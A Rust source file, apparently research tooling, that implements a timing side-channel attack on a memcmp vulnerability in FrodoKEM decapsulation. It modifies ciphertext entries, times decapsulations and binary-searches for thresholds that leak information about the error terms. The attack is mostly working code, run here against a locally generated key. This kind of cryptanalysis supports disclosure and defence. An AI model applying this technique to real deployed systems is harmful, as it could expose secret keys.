use crate::attack::memcmp_frodo::MeasureSource;
use liboqs_rs_bindings as oqs;
use log::{debug, info, trace, warn};
use log_derive::logfn_inputs;
use oqs::frodokem::FrodoKem;
use oqs::frodokem::KemBuf;
use std::convert::TryInto;

#[derive(Debug)]
enum Sign<T> {
    Plus(T),
    Minus(T),
}

/// Function that deterministically modifies the input vector.
///
/// To undo apply the same modification with Sign::Minus instead.alloc
/// We operate on modulo q
#[logfn_inputs(Trace)]
fn modify<FRODO: FrodoKem>(
    ct: &mut FRODO::Ciphertext,
    index_ij: usize,
    amount: Sign<u16>,
) -> Result<(), String> {
    #![allow(non_snake_case)]
    trace!("started modify!");
    //Unpack the buffer into a pair of matrices encoded as a vector
    let (Bp, mut C) = FRODO::unpack(ct)?;
    let Cslice = C.as_mut_slice();

    let tomod = Cslice[index_ij] as u32;

    let qmax: u32 = FRODO::params().PARAM_QMAX;

    let newval = match amount {
        Sign::Plus(a) => (tomod + a as u32) % qmax,
        Sign::Minus(a) => {
            //add qmax to prevent negative wrapping
            (tomod + qmax - a as u32) % qmax
        }
    };

    Cslice[index_ij] = newval.try_into().unwrap();

    //Repack the matrices into the buffer
    FRODO::pack(Bp, C, ct)?;

    Ok(())
}

#[logfn_inputs(Trace)]
fn mod_measure<FRODO: FrodoKem>(
    amount: u16,
    index_ij: usize,
    iterations: usize,
    measure_source: &MeasureSource,
    short_circuit_threshold: Option<u64>,
    ct: &mut FRODO::Ciphertext,
    ss: &mut FRODO::SharedSecret,
    sk: &mut FRODO::SecretKey,
) -> Result<u64, String> {
    //Modify
    modify::<FRODO>(ct, index_ij, Sign::Plus(amount))?;
    let mut lowest = u64::max_value();
    'sample: for it in 0..iterations {
        let m = measure_source.measure(|| FRODO::decaps_measure(ct, ss, sk));
        if let Some(time) = m? {
            if time < lowest {
                lowest = time;
                if let Some(t) = short_circuit_threshold {
                    if lowest < t {
                        info!("C[{}/{}] => Found measurment below threshold already after {} iterations.", index_ij, FRODO::C::len()-1, it);
                        break 'sample;
                    }
                }
            }
        };
    }
    //Unmodify
    modify::<FRODO>(ct, index_ij, Sign::Minus(amount))?;
    Ok(lowest)
}

fn max_mod<FRODO: FrodoKem>() -> u16 {
    let params = FRODO::params::<u32>();
    2u16.pow(params.PARAM_LOGQ - params.PARAM_B)
}

#[logfn_inputs(Trace)]
fn search_modification<FRODO: FrodoKem>(
    index_ij: usize,
    iterations: usize,
    measure_source: &MeasureSource,
    short_circuit_threshold: u64,
    ciphertext: &mut FRODO::Ciphertext,
    shared_secret_d: &mut FRODO::SharedSecret,
    secret_key: &mut FRODO::SecretKey,
) -> Result<u16, String> {
    let maxmod = max_mod::<FRODO>();
    let mut high = maxmod;
    let mut low = 0;
    let found = loop {
        let currentmod: u16 = ((high as usize + high as usize + low as usize) as usize / 3)
            .try_into()
            .map_err(|_| "overflow")?;
        debug!("high: {}, low: {}", high, low);
        info!(
            "C[{}/{}] => Testing adding {} to C[{}] with {} iterations.",
            index_ij,
            FRODO::C::len() - 1,
            currentmod,
            index_ij,
            iterations
        );
        let time = mod_measure::<FRODO>(
            currentmod,
            index_ij,
            iterations,
            &measure_source,
            Some(short_circuit_threshold),
            ciphertext,
            shared_secret_d,
            secret_key,
        )?;

        debug!("time measurment is {}", time);
        if time >= short_circuit_threshold {
            info!(
                "C[{}/{}] => +Raising lowerbound to {}",
                index_ij,
                FRODO::C::len() - 1,
                currentmod
            );
            low = currentmod;
        } else {
            info!(
                "C[{}/{}] => -Lowering upperbound to {}",
                index_ij,
                FRODO::C::len() - 1,
                currentmod
            );
            high = currentmod;
        }
        if high - low == 1 {
            break low;
        }
    };
    if high == maxmod {
        warn!("Upper bound never changed, we might have missed the real threshold modification!");
    }
    if low == 0 {
        warn!("Lower bound never changed, we might have missed the real threshold modification!");
    }

    Ok(found)
}

#[logfn_inputs(Trace)]
pub fn find_e<FRODO: FrodoKem>(
    warmup: usize,
    iterations: usize,
    measure_source: MeasureSource,
) -> Result<(), String> {
    info!(
        "Launching the find_e routine against {} MEMCMP vulnerability.",
        FRODO::name()
    );
    let mut public_key = FRODO::PublicKey::new();
    let mut secret_key = FRODO::SecretKey::new();
    let mut ciphertext = FRODO::Ciphertext::new();

    info!("Generating keypair");
    FRODO::keypair(&mut public_key, &mut secret_key)?;

    info!("Encapsulating shared secret and generating ciphertext");
    let mut shared_secret_e = FRODO::SharedSecret::new();
    let mut shared_secret_d = FRODO::SharedSecret::new();
    FRODO::encaps(&mut ciphertext, &mut shared_secret_e, &mut public_key)?;

    info!("Running decryption oracle {} times for warmup.", warmup);
    let warmuptime = mod_measure::<FRODO>(
        0,
        0,
        warmup,
        &measure_source,
        None,
        &mut ciphertext,
        &mut shared_secret_d,
        &mut secret_key,
    )?;
    debug!("Warmup time {}", warmuptime);

    info!("Running {} iterations after modifying ciphertext by adding {} to index 0 of C, to establish upper bound timing threshold.", iterations, 1);
    let threshold_high = mod_measure::<FRODO>(
        1,
        0,
        iterations,
        &measure_source,
        None,
        &mut ciphertext,
        &mut shared_secret_d,
        &mut secret_key,
    )?;

    let maxmod = max_mod::<FRODO>();

    info!("Running {} iterations with max cipertext modification ({}) at index 0 of C to establish lower bound timing threshold.", iterations, maxmod);
    let threshold_low = mod_measure::<FRODO>(
        maxmod,
        0,
        iterations,
        &measure_source,
        None,
        &mut ciphertext,
        &mut shared_secret_d,
        &mut secret_key,
    )?;

    let threshold = (threshold_high + threshold_low) / 2;
    info!(
        "Using ({}+{})/2={} as threshold value, everything below will be used to detect changes to B as well.", threshold_high, threshold_low,
        threshold
    );

    let mods : Result<Vec<_>, String> = (0..FRODO::C::len()).map(|index_ij|{
        info!("C[{}/{}] => Starting binary search for determining maximum modifications to C without affecting B, for this index.", index_ij, FRODO::C::len()-1);

        let themod = search_modification::<FRODO>(
            index_ij,
            iterations,
            &measure_source,
            threshold,
            &mut ciphertext,
            &mut shared_secret_d,
            &mut secret_key,
        )?;

        info!(
            "C[{}/{}] => Found {}!",index_ij, FRODO::C::len()-1,
            themod
        );

        Ok(themod)
    }).collect();

    //bailout on error
    let mods = mods?;

    info!("We have found all mods!");
    info!("{:?}", mods);

    Ok(())
}
